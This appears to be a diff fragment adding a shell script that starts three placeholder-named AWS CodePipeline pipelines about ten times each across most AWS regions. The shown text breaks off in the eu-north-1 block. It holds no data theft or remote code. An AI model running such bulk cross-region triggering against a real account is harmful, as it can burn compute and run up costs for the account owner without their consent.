+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region us-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region us-west-2
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-south-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-south-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-3
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-2
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-southeast-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-southeast-2
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ap-northeast-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ap-northeast-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region ca-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region ca-central-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-central-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-central-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-2
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-2
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-west-3
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-west-3
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
